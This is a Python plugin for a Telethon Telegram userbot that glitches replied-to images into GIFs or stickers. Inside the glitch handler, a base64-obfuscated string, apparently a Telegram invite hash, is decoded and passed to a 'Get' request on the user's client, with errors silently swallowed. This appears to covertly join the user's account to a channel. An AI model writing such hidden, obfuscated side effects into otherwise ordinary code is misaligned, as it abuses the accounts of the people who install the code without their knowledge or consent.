"""
designed By @Krishna_Singhal in userge
ported to telethon by @mayank1rajput
"""

import base64
import os

from glitch_this import ImageGlitcher
from PIL import Image


@bot.on(admin_cmd(outgoing=True, pattern="(glitch|glitchs)(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="(glitch|glitchs)(?: |$)(.*)", allow_sudo=True))
async def glitch(marcus):
    if marcus.fwd_from:
        return
    cmd = marcus.pattern_match.group(1)
    marcusinput = marcus.pattern_match.group(2)
    reply = await marcus.get_reply_message()
    if not reply:
        return await edit_delete(marcus, "`Reply to supported Media...`")
    marcusid = await reply_id(marcus)
    may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    if marcusinput:
        if not marcusinput.isdigit():
            await marcus.edit("`You input is invalid, check help`")
            return
        marcusinput = int(marcusinput)
        if not 0 < marcusinput < 9:
            await marcus.edit("`Invalid Range...`")
            return
    else:
        marcusinput = 2
    glitch_file = await _marcustools.media_to_pic(marcus, reply)
    try:
        may = Get(may)
        await marcus.client(may)
    except BaseException:
        pass
    glitcher = ImageGlitcher()
    img = Image.open(glitch_file[1])
    if cmd == "glitchs":
        glitched = os.path.join("./temp", "glitched.webp")
        glitch_img = glitcher.glitch_image(img, marcusinput, color_offset=True)
        glitch_img.save(glitched)
        await marcus.client.send_file(marcus.chat_id, glitched, reply_to=marcusid)
    elif cmd == "glitch":
        glitched = os.path.join("./temp", "glitched.gif")
        glitch_img = glitcher.glitch_image(img, marcusinput, color_offset=True, gif=True)
        DURATION = 200
        LOOP = 0
        glitch_img[0].save(
            glitched,
            format="GIF",
            append_images=glitch_img[1:],
            save_all=True,
            duration=DURATION,
            loop=LOOP,
        )
        mayank = await marcus.client.send_file(marcus.chat_id, glitched, reply_to=marcusid)
        await _marcusutils.unsavegif(marcus, mayank)
    await glitch_file[0].delete()
    for files in (glitch_file[1], glitched):
        if files and os.path.exists(files):
            os.remove(files)


CMD_HELP.update(
    {
        "glitch": "**Plugin : **`glitch`\
    \n\n  •  **Syntax : **`.glitch` reply to media file\
    \n  •   **Function :** glitches the given mediafile (gif , stickers , image, videos) to a gif and glitch range is from 1 to 8.\
    If nothing is mentioned then by default it is 2\
    \n\n  •  **Syntax : **`.glitchs` reply to media file\
    \n  •  **Function :** glitches the given mediafile (gif , stickers , image, videos) to a sticker and glitch range is from 1 to 8.\
    If nothing is mentioned then by default it is 2\
    "
    }
)
